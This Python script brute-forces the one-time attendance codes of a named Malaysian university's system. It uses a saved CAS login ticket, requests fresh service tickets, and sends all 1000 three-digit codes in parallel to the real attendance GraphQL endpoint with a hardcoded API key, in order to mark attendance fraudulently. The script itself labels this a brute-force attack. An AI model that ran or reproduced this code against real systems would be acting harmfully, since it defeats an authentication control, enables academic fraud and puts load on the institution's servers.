import requests
import os
import json
import sys
import logging
import concurrent.futures
from collections import Counter
from tqdm import tqdm
from dotenv import load_dotenv
from requests.adapters import HTTPAdapter

# Load environment variables from .env file
load_dotenv()

SESSION_FILE = "session.json"
CAS_BASE_URL = "https://cas.apiit.edu.my/cas"

API_ATTENDIX_SERVICE_URL = "https://api.apiit.edu.my/attendix"
GRAPHQL_URL = "https://attendix.apu.edu.my/graphql"
API_KEY = "da2-u4ksf3gspnhyjcokxzugo3mqr4"
MAX_WORKERS = 10 # Number of parallel requests. BE CAREFUL WITH THIS!

def get_st_and_check_otp(session, tgt, otp):
    """
    Gets a fresh ST and then checks a single OTP code.
    This is designed to be run in a separate thread.
    Returns a tuple: (status, result)
    """
    # === Step 1: Get a fresh Service Ticket (ST) ===
    st_headers = {
        'Content-type': 'application/x-www-form-urlencoded',
        'Origin': 'https://apspace.apu.edu.my',
        'Referer': 'https://apspace.apu.edu.my/',
        'Content-Length': '0',
    }
    st_url = f"{CAS_BASE_URL}/v1/tickets/{tgt}"
    st_params = {'service': API_ATTENDIX_SERVICE_URL}
    
    try:
        st_response = session.post(st_url, headers=st_headers, params=st_params, timeout=10)
        if st_response.status_code != 200:
            return 'ERROR_ST', f"Failed to get ST: HTTP {st_response.status_code}"
        st = st_response.text
    except requests.exceptions.RequestException:
        return 'ERROR_ST', "Failed to get ST"

    # === Step 2: Check the OTP with the fresh ST ===
    otp_str = f"{otp:03d}"
    otp_headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://apspace.apu.edu.my',
        'referer': 'https://apspace.apu.edu.my/',
        'ticket': st,
        'x-api-key': API_KEY,
        'x-amz-user-agent': 'aws-amplify/2.0.7',
    }
    query = "mutation updateAttendance($otp: String!) { updateAttendance(otp: $otp) { id attendance classcode } }"
    payload = {"operationName": "updateAttendance", "variables": {"otp": otp_str}, "query": query}

    try:
        response = session.post(GRAPHQL_URL, headers=otp_headers, json=payload, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if "errors" in data and data["errors"]:
                error_msg = data["errors"][0].get("errorType", "Unknown GraphQL Error")
                return 'FAIL', error_msg
            else:
                return 'SUCCESS', otp_str
        else:
            return 'ERROR_HTTP', f"HTTP {response.status_code}"

    except requests.exceptions.Timeout:
        return 'ERROR_TIMEOUT', 'Request timed out'
    except requests.exceptions.RequestException as e:
        return 'ERROR_OTHER', str(e)


def main():
    """Main function to find the attendance code."""
    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
    logging.getLogger("requests").setLevel(logging.WARNING)
    logging.getLogger("urllib3").setLevel(logging.WARNING)

    logging.warning("### ATTENTION: This script performs a brute-force attack. ###")
    logging.warning("### Use it at your own risk. You may get your IP or account banned. ###")
    
    if not os.path.exists(SESSION_FILE):
        logging.error(f"Session file '{SESSION_FILE}' not found. Run 'view_attendance.py' first.")
        sys.exit(1)

    session = requests.Session()
    tgt = None
    try:
        with open(SESSION_FILE, 'r') as f:
            saved_session = json.load(f)
            session.cookies.update(saved_session.get("cookies"))
            tgt = saved_session.get("tgt")
        if not tgt:
            raise ValueError("TGT not found in session file.")
    except (IOError, json.JSONDecodeError, ValueError) as e:
        logging.error(f"Failed to load session: {e}. Please refresh it by running 'view_attendance.py'.")
        sys.exit(1)

    adapter = HTTPAdapter(pool_connections=MAX_WORKERS, pool_maxsize=MAX_WORKERS)
    session.mount('https://', adapter)

    logging.info(f"Starting OTP brute-force with {MAX_WORKERS} parallel workers...")
    
    found_code = None
    error_counts = Counter()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(get_st_and_check_otp, session, tgt, i): i for i in range(1000)}
        
        try:
            for future in tqdm(concurrent.futures.as_completed(futures), total=1000, desc="Checking OTPs"):
                status, result = future.result()
                
                if status == 'SUCCESS':
                    found_code = result
                    logging.info(f"\nSUCCESS! Shutting down workers...")
                    executor.shutdown(wait=False, cancel_futures=True)
                    break 
                else:
                    error_counts[result] += 1

        except KeyboardInterrupt:
            logging.warning("\nOperation cancelled by user. Shutting down...")
            executor.shutdown(wait=False, cancel_futures=True)


    print("-" * 50)
    if found_code:
        print("\n" + "🎉" * 20)
        print(f"  Code found: {found_code}")
        print("🎉" * 20 + "\n")
    else:
        logging.error("Could not find the attendance code.")

    if error_counts:
        print("\nError Summary:")
        for error, count in error_counts.items():
            print(f"  - {error}: {count} times")
    print("-" * 50)


if __name__ == "__main__":
    main() 